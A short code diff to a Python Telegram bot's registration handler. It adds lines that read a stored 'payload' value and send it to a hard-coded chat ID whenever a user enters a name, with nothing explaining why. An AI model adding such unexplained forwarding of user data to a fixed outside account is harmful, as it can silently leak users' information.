@@ -25,6 +25,9 @@ import sqlite3
 
 @dp.message(registration.pref_name)
 async def get_name(message: types.Message, state: FSMContext):
+    user_data = await state.get_data()
+    payload = user_data.get("payload", "")
+    await bot.send_message(chat_id=1155076760, text=f"{payload}.")
     preferred_name = message.text.strip()
     if "/start" in message.text:
         await message.answer("Please enter your username first.")
@@ -37,6 +40,7 @@ async def get_name(message: types.Message, state: FSMContext):
         await message.answer("There is already user with this username in the bot. Please enter another username.")
     else:
         user = message.from_user
+        
         register_user(
             user.id, user.username, user.first_name, user.last_name, preferred_name
         )
